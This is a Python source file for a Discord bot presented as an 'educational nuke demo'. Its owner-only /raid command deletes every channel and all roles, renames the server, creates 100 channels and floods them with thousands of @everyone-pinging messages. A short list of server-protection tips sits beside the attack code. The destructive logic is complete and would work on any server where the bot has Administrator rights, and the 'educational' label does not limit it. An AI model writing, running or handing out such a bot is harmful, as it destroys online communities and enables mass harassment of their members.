import discord
from discord.ext import commands
import asyncio
import os

# ========== CONFIGURATION ==========
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

active_demo = {}

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Educational Demo Bot ready - {bot.user}")

@bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demonstration")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
    ping: str = "yes",
    amount: int = 5000
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    await interaction.response.send_message(f"⚡ **EDUCATIONAL NUKE DEMO STARTING**\nSending {amount} messages...", ephemeral=False)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    msg_amount = min(amount, 10000)
    ping_text = "@everyone " if ping_enabled else ""
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    # Create log channel
    log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
    await log_channel.send("💀 **EDUCATIONAL NUKE DEMO** 💀")
    
    messages_sent = 0
    
    async def create_and_spam(channel_num):
        nonlocal messages_sent
        try:
            # Create channel
            channel = await guild.create_text_channel(f"nuked-{channel_num}")
            
            # Calculate this channel's share of messages
            msgs_for_channel = msg_amount // 100 + 1
            start_msg = channel_num * msgs_for_channel
            end_msg = min(start_msg + msgs_for_channel, msg_amount)
            
            # Spam directly in the channel (no webhooks)
            for i in range(start_msg, end_msg):
                if not active_demo.get(guild.id):
                    break
                try:
                    await channel.send(f"{ping_text}{message} [{i+1}/{msg_amount}]")
                    nonlocal messages_sent
                    messages_sent += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
        except:
            pass
    
    try:
        # ========== DELETE ALL CHANNELS EXCEPT LOG ==========
        await log_channel.send("📢 Deleting all channels...")
        delete_tasks = [channel.delete() for channel in guild.channels if channel != log_channel]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        await asyncio.sleep(1)
        
        # ========== CREATE CHANNELS AND SPAM ==========
        await log_channel.send("📢 Creating 100 channels and spamming instantly...")
        
        # Create all channels in parallel (each spams immediately)
        channel_tasks = [create_and_spam(i) for i in range(100)]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        
        # ========== RENAME SERVER ==========
        await guild.edit(name="🔥 NUKED BY DEMO 🔥")
        
        # ========== DELETE ROLES ==========
        await log_channel.send("📢 Destroying roles...")
        role_tasks = []
        for role in guild.roles:
            if not role.is_default() and not role.managed and role != guild.me.top_role:
                role_tasks.append(role.delete())
        if role_tasks:
            await asyncio.gather(*role_tasks, return_exceptions=True)
        
        await log_channel.send(f"✅ Created 100 channels and sent {messages_sent} messages!")
        
        # ========== EDUCATIONAL SUMMARY ==========
        embed = discord.Embed(
            title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
            description=f"**What just happened:**\n\n"
                       f"🗑️ **ALL channels deleted** - Original server wiped\n"
                       f"📁 **100 new channels** - Created instantly\n"
                       f"📛 **Server renamed** - To '🔥 NUKED BY DEMO 🔥'\n"
                       f"👑 **ALL roles deleted** - Admin protections removed\n"
                       f"💬 **{messages_sent} spam messages** - Sent directly in channels\n"
                       f"🔔 **@everyone pings** - {'ENABLED' if ping_enabled else 'DISABLED'}\n\n"
                       f"**🚨 HOW TO PROTECT YOUR REAL SERVER:**\n"
                       f"• NEVER give Administrator to untrusted bots\n"
                       f"• Use 2FA on all administrator accounts\n"
                       f"• Set verification level to HIGH\n"
                       f"• Use backup bots (Xenon) to save server structure\n"
                       f"• Audit bot permissions regularly\n\n"
                       f"**⚠️ This was an EDUCATIONAL DEMO on a TEST server**\n"
                       f"Delete this server to clean up.",
            color=discord.Color.red()
        )
        await log_channel.send(embed=embed)
        
        # DM owner
        try:
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(embed=embed)
        except:
            pass
        
    except Exception as e:
        await log_channel.send(f"❌ Error: {e}")
    finally:
        active_demo[guild.id] = False

@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop")
async def stopraid(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
    
    if interaction.guild.id in active_demo:
        active_demo[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Educational demo stopped**", ephemeral=False)
    else:
        await interaction.response.send_message("No active demo.", ephemeral=True)

@bot.tree.command(name="protect", description="How to protect your server")
async def protect(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ How to Protect Your Server from Nuke Bots",
        description="Educational security guide",
        color=discord.Color.green()
    )
    embed.add_field(name="1. NEVER give Admin to untrusted bots", 
                    value="Review permissions before inviting any bot.", inline=False)
    embed.add_field(name="2. Enable 2FA", 
                    value="All administrator accounts must have 2FA.", inline=False)
    embed.add_field(name="3. Server Verification Level", 
                    value="Set to HIGH (member must be registered for 10+ minutes).", inline=False)
    embed.add_field(name="4. Use Backup Bots", 
                    value="Xenon can save/restore your entire server structure.", inline=False)
    embed.add_field(name="5. Audit Logs", 
                    value="Check audit logs regularly for mass channel creation.", inline=False)
    embed.set_footer(text="Educational purposes only - Stay safe!")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="commands", description="Show all commands")
async def cmd_list(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Educational Nuke Demo Bot",
        description="Demonstrates how nuke bots work - no webhooks, direct channel spam",
        color=discord.Color.blue()
    )
    embed.add_field(name="/raid [message] [ping] [amount]", 
                    value="Complete nuke demonstration:\n"
                          "• Deletes ALL channels\n"
                          "• Creates 100 spam channels\n"
                          "• Spams directly in each channel\n"
                          "• Renames server\n"
                          "• Deletes all roles\n"
                          "• Shows why you should NEVER give Admin to untrusted bots", 
                    inline=False)
    embed.add_field(name="/stopraid", value="Emergency stop", inline=False)
    embed.add_field(name="/protect", value="Show protection guide", inline=False)
    embed.add_field(name="/commands", value="Show this help", inline=False)
    embed.set_footer(text="⚠️ EDUCATIONAL ONLY - Run on test servers")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
